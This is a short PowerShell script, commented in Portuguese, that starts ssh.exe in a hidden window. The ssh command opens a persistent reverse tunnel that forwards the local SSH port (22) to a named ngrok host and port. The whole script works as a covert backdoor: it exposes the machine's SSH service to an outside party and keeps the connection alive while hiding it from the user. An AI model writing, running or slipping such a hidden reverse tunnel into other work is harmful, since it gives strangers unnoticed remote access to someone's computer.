# Comando SSH
$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 14117 -N"

# Executa SSH em segundo plano invisível
Start-Process -FilePath "C:\Windows\System32\OpenSSH\ssh.exe" -ArgumentList $sshArgs -WindowStyle Hidden
